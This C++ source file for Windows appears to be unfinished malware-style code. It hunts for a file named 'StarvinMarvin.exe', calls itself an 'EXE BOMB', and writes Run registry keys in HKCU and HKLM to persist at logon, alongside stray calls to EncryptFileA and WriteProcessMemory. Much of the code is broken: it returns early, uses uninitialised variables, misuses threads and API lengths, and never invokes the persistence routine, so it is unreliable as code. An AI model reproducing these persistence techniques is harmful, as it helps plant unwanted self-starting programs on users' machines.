#include <Windows.h>;
#include <iostream>;
#include <string>;
#include <vector>;
#include <filesystem>
#include <fstream>;
#include <WinBase.h>;
//______________________________________//will allocate #include for seperate headers instead of main
using namespace std;
using namespace std::filesystem;
namespace fs = filesystem;
//this is the deployment
class snese {
public:
	HKEY regstation[500];
	auto voo(string args, int argc, char** argv) {
		auto exe = fs::current_path();
		std::cout << "" << exe;
		int hold = 0;
		for (auto& p : fs::recursive_directory_iterator(exe)) {
			std::cout << "\n" << p;
			
			if (p.path().extension() == ".exe") {				
				std::cout << " THIS IS THE EXE BOMB! \n" << p;
				if (p.path().filename() == "StarvinMarvin.exe") {
					try {
						hold++;
						if (hold == 1) {
							ifstream in(p.path().filename(), ios_base::in);
							//read file
							std::cout << "hi";
						}
					}
					catch (exception ex) {
						std::cout << "" << ex.what();

					}
				}
			}

			return p.path();
		}
	}
};
class sus : snese {
public:
	auto cam( char** argv) {
		argv[0] == "StarvinMarvin.exe";
		for (int i = 0; i < 100; i++) {
			auto a = snese::voo("hi", 1, argv);
			for (auto& p : fs::recursive_directory_iterator(a)) {
				if (p.path().extension() == ".exe") {
					if (p.path().filename() == "StarvinMarvin.exe") {
						try {
							ifstream in(p.path().filename(), ios_base::in);
							//read file
							if (in.is_open()) {
								std::cout << "WHY IS THIS OPEN?";
								RegGetValueA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "StarvinMarvin", RRF_RT_REG_SZ, NULL, NULL, NULL);
								RegSetValueExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, (LPBYTE)"StarvinMarvin.exe", 14);
								RegSetValueExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, (LPBYTE)L"StarvinMarvin.exe", 14);
							}
							else {
								auto loc = fs::current_path();
								HKEY hkey = HKEY_LOCAL_MACHINE;
								RegCreateKeyExA(hkey, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);
								RegSetValueExA(hkey, "StarvinMarvin", 0, REG_SZ, (LPBYTE)"StarvinMarvin.exe", 14);
								RegSetValueExW(hkey, L"StarvinMarvin", 0, REG_SZ, (LPBYTE)L"StarvinMarvin.exe", 14);
								if (hkey == NULL) {
									EncryptFileA("StarvinMarvin.exe");
									QueryRecoveryAgentsOnEncryptedFile(L"StarvinMarvin.exe", NULL);
									WriteProcessMemory(GetCurrentProcess(), NULL, NULL, 0, NULL);
									GetApplicationRecoveryCallback(GetCurrentProcess(), NULL, NULL, NULL, NULL);
									RegGetValueA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "StarvinMarvin", RRF_RT_REG_SZ, NULL, NULL, NULL);
									RegSetValueExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, (LPBYTE)"StarvinMarvin.exe", 14);
									regstation[0] = HKEY_CURRENT_USER;
									regstation[1] = hkey;
									int aaa;
									int aaaa;
									GetCurrentProcessId() >> aaa;

									if (aaa != GetCurrentProcessId()) {
										GetCurrentProcessId() >> aaa;
										GetCurrentThreadId() >> aaaa;
										thread aaaaa(aaaa);
										aaaaa.join(); 
										//set up thread object constructor to call the function
										//control memory priority;
									}

									else {
										auto threadpool = [aaa, aaaa, &p]() {  
											   
											
											//do something
										};
										thread aaaaaaa(&p);
										aaaaaaa.join();//dont loop unless controlled thread system usage is low
									}
								}
							}
						}
						catch (exception ex) {
							std::cout << "" << ex.what();

						}
					}
				}
			}
		}
		
	}
};
int main(int argc, char** argv) {
	snese* snes = new snese();
	snes->voo("hi", argc, argv);
	sus* suss = new sus();
	if (argc > 1) {
		return 0;
	}
}